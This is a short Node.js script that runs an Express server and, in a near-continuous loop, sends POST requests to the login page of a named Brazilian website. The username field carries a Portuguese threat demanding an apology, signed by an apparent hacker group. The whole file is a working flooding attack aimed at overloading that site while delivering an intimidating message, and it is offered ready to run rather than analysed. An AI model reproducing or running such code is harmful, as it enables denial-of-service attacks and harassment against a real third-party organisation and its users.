var axios = require("axios")
const express = require("express")
const app = express()

app.get("/",(req,res)=>{
res.json({status:"WORKING"})
})


app.listen(process.env.PORT, ()=>{
    console.log("IZI")
})


setInterval(()=>{
    axios({
        url:"https://dphsystem.com.br/login",
        method:"POST",
        Headers:{
            "content-type":" application/x-www-form-urlencoded; charset=UTF-8"
        },
        data:"user=Peçam_desculpas_no_centro_ou_esse_sera_o_fim_do_System_BY_ANONSTACK254&pass=anon&code=4522"
    }).then((response)=>{
        console.log("FOI")
    }).catch((e)=>{
        console.log("E")
    })
},0.001)
